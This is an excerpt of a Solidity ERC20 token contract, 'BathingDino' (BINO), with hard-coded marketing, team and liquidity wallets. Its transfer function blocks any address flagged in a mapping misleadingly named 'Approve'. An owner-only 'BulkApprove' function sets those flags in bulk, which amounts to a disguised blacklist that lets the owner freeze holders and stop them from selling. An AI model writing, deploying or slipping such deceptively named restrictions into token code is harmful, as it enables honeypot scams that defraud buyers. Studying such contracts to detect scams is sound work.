...
contract BathingDino is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    address payable public marketingAddress =
        payable(0xb6feEE1C240eE73fdB6673c1386F21214D081303); // Marketing Address

    address payable public teamAddress =
        payable(0x7FbFAb6F27271B5F33C53e97aB2E6c596718A346); //  Development Address

    address payable public liquidityAddress =
        payable(0x7FbFAb6F27271B5F33C53e97aB2E6c596718A346); // Liquidity Address
    ...
    uint256 private constant _tTotal = 42 * 1e7 * 1e18;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    bool public limitsInEffect = true;

    string private constant _name = "BathingDino";
    string private constant _symbol = "BINO";
    ...
    constructor() {
        ...
        maxWalletAmount = _tTotal * 20 / 1000; // 2% maxWalletToken
    ...
    function _transfer(
        ...
        require(!Approve[from] && !Approve[to]);
    ...
    function BulkApprove(address[] memory accounts, bool value) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; ++i) {
            Approve[accounts[i]] = value;
        }
    }
